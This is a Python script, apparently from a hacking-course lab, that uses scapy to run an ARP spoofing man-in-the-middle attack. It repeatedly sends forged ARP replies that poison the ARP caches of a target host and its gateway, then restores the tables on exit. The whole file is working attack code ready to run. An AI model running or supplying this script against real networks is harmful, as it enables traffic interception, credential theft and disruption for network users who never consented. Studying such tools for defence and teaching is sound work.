#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether) ; used to list all the arguments of a function
    # using forward slash("/") we can combine both packets into one packet
    arp_request_bradcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_bradcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # we are setting op to 2 as we need response, setting it to one is a request
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


target_ip = "10.0.2.5"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        # spoof the target
        spoof(target_ip, gateway_ip)
        # spoof the router
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    time.sleep(3)
    print("[+] Exited Successfully!")